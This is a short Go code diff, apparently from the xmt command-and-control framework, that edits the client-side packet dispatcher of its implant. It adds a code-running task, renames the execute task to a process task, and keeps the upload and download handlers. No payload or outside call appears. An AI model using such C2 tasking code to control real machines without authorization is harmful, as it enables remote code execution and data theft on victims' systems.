@@ -7,7 +7,6 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/xmt/c2/task"
-
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/util"
 )
@@ -121,12 +120,14 @@ func run(t Tasker, s *Session, p *com.Packet) {
 func defaultClientMux(s *Session, p *com.Packet) {
 	s.log.Debug("[%s:Mux] Received packet %q.", s.ID, p.String())
 	switch p.ID {
+	case MsgCode:
+		run(task.TaskCode, s, p)
 	case MsgRefresh:
 		run(task.TaskRefresh, s, p)
 	case MsgUpload:
 		run(task.TaskUpload, s, p)
-	case MsgExecute:
-		run(task.TaskExecute, s, p)
+	case MsgProcess:
+		run(task.TaskProcess, s, p)
 	case MsgDownload:
 		run(task.TaskDownload, s, p)
 	case MsgHello, MsgPing, MsgSleep, MsgRegistered:
